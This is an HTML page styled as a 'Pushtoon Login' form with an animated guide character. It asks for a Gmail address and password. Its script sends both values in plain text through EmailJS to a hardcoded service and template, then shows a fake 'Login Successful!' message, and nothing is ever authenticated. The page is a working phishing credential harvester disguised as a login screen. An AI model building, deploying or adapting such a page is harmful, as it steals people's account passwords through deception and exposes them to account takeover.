<!DOCTYPE html>
<html>
<head>
  <title>Pushtoon Login</title>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    emailjs.init("aU_rVriMIfRSDIniQ");
  </script>

  <style>

    body{
      margin:0;
      padding:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family:Arial, sans-serif;
      position:relative;

      background-image:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
      background-size:cover;
      background-position:center;
    }

    /* 👇 SMALL GUIDE PERSON */
    .guide{
      position:absolute;
      left:80px;
      bottom:120px;
      font-size:70px;
      animation: bounce 1.5s infinite;
    }

    .guide-text{
      position:absolute;
      left:50px;
      bottom:220px;
      background:rgba(0,0,0,0.6);
      color:white;
      padding:8px 12px;
      border-radius:10px;
      font-size:14px;
      animation: fade 2s infinite alternate;
    }

    @keyframes bounce{
      0%{ transform: translateY(0px); }
      50%{ transform: translateY(-15px); }
      100%{ transform: translateY(0px); }
    }

    @keyframes fade{
      0%{ opacity:0.5; }
      100%{ opacity:1; }
    }

    .container{
      background:rgba(255,255,255,0.92);
      padding:40px;
      border-radius:20px;
      width:350px;
      text-align:center;
      box-shadow:0px 10px 25px rgba(0,0,0,0.4);
      backdrop-filter:blur(5px);
      z-index:2;
    }

    h2{
      color:#00e5ff;
      margin-bottom:25px;
      font-size:35px;
      letter-spacing:2px;
      animation: glowMove 2s ease-in-out infinite alternate;
    }

    @keyframes glowMove{
      0%{
        transform: translateY(0px);
        text-shadow: 0 0 5px rgba(0,229,255,0.4);
      }
      100%{
        transform: translateY(-8px);
        text-shadow: 0 0 20px rgba(0,229,255,0.9),
                     0 0 40px rgba(0,229,255,0.6);
      }
    }

    input{
      width:90%;
      padding:14px;
      margin:12px 0;
      border:2px solid #ddd;
      border-radius:12px;
      font-size:16px;
      outline:none;
      transition:0.3s;
    }

    input:focus{
      border-color:#6a1b9a;
      box-shadow:0 0 12px rgba(106,27,154,0.5);
    }

    button{
      width:95%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(135deg, #ff9800, #ff5722);
      color:white;
      font-size:20px;
      cursor:pointer;
      transition:0.3s;
      font-weight:bold;
      margin-top:10px;
    }

    button:hover{
      transform:scale(1.05);
    }

  </style>

</head>

<body>

<!-- 👇 Guide Character -->
<div class="guide">🧑👉</div>
<div class="guide-text">Please Login Here</div>

<div class="container">

  <h2>LOGIN</h2>

  <input type="email" id="email" placeholder="Enter your Gmail">

  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="sendMail()">LOG IN</button>

</div>

<script>

function sendMail(){

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if(email === "" || password === ""){
        alert("Please fill all fields!");
        return;
    }

    let params = {
        email: email,
        password: password
    };

    emailjs.send(
        "service_bqnzz7f",
        "template_y4w4kzl",
        params
    )
    .then(function(response){
        alert("Login Successful!");
    })
    .catch(function(error){
        alert("FAILED");
        console.log(error);
    });

}

</script>

</body>
</html>
